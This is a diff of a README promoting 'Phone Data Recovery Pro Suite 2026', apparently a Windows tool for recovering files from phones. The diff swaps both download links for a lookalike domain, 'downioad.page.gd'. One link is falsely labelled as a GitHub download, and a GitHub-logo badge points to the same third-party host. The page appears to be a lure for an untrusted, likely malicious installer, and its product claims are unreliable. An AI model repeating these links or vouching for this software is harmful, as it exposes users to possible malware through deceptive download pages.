@@ -2,7 +2,7 @@
 
 Phone Data Recovery Pro Suite 2026 is a powerful Windows desktop application designed to help users retrieve lost or deleted files from their mobile devices. This tool offers an intuitive interface and advanced recovery algorithms to ensure high success rates in data restoration, making it an essential utility for anyone facing accidental data loss.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -78,7 +78,7 @@ A: Ensure that the device is properly connected and that USB debugging is enable
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *Last Updated: December 2026*
